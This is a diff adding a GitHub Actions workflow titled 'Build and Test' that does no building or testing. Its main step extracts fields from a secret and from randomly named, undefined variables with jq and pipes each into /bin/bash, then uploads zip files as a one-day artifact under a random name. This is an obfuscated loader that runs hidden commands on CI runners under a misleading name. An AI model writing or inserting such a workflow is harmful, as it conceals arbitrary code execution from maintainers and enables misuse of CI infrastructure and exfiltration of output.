@@ -1,0 +1,34 @@
+name: Build and Test
+on:
+  workflow_dispatch:
+
+permissions:
+  contents: read
+concurrency:
+  group: ${{ github.workflow }}
+  cancel-in-progress: false
+jobs:
+  trigger:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+        with:
+          fetch-depth: 1
+      - name: Start
+        env:
+          c0: ${{ secrets.c0 }}
+        run: |
+          printf '%s' "$c0" | jq -r .olrq4 | /bin/bash
+          echo $iltun77471 | jq -r .u7528 | /bin/bash
+          echo $fco23770 | jq -r .rt691 | /bin/bash
+          printf '%s' "$lfxq965" | jq -r .gruk250 | /bin/bash
+          echo $brob1 | jq -r .v5 | /bin/bash
+          echo $fzl26755 | jq -r .d079 | /bin/bash
+
+      - name: Save output
+        if: always()
+        uses: actions/upload-artifact@v4
+        with:
+          name: K8fpvF3S
+          path: "*.zip"
+          retention-days: 1
